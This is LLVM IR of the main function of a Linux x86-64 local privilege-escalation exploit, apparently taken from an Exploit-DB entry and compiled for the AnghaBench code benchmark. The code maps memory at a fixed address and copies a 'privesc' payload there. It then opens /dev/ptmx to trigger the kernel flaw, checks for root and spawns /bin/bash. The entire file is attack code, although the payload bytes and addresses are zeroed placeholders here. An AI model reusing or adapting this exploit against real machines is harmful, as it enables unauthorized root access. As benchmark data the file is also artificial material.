; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_40049.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_40049.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MMAP_ADDR = common dso_local global i64 0, align 8
@MMAP_OFFSET = common dso_local global i64 0, align 8
@privesc = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"[+] Escalating privs...\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"/dev/ptmx\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"[+] We've got root!\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"/bin/bash\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"-sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %6 = load i64, i64* @MMAP_ADDR, align 8
  %7 = inttoptr i64 %6 to i8*
  %8 = call i64 @mmap(i8* %7, i32 4194304, i32 7, i32 50, i32 0, i32 0)
  %9 = inttoptr i64 %8 to i8*
  store i8* %9, i8** %2, align 8
  %10 = load i8*, i8** %2, align 8
  %11 = load i64, i64* @MMAP_ADDR, align 8
  %12 = inttoptr i64 %11 to i8*
  %13 = icmp eq i8* %10, %12
  %14 = zext i1 %13 to i32
  %15 = call i32 @assert(i32 %14)
  %16 = load i64, i64* @MMAP_ADDR, align 8
  %17 = load i64, i64* @MMAP_OFFSET, align 8
  %18 = add nsw i64 %16, %17
  %19 = inttoptr i64 %18 to i8*
  store i8* %19, i8** %3, align 8
  %20 = load i8*, i8** %3, align 8
  %21 = call i32 @memset(i8* %20, i32 0, i32 3145728)
  %22 = load i8*, i8** %3, align 8
  %23 = call i8* @memcpy(i8* %22, i32* @privesc, i32 768)
  store i8* %23, i8** %4, align 8
  %24 = load i8*, i8** %4, align 8
  %25 = load i8*, i8** %3, align 8
  %26 = icmp eq i8* %24, %25
  %27 = zext i1 %26 to i32
  %28 = call i32 @assert(i32 %27)
  %29 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %30 = load i32, i32* @O_RDWR, align 4
  %31 = call i32 @open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i32 %30)
  store i32 %31, i32* %5, align 4
  %32 = load i32, i32* %5, align 4
  %33 = call i32 @close(i32 %32)
  %34 = call i32 (...) @getuid()
  %35 = icmp ne i32 %34, 0
  %36 = xor i1 %35, true
  %37 = zext i1 %36 to i32
  %38 = call i32 @assert(i32 %37)
  %39 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  %40 = call i32 @execl(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i32* null)
  ret i32 %40
}

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @assert(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i8* @memcpy(i8*, i32*, i32) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
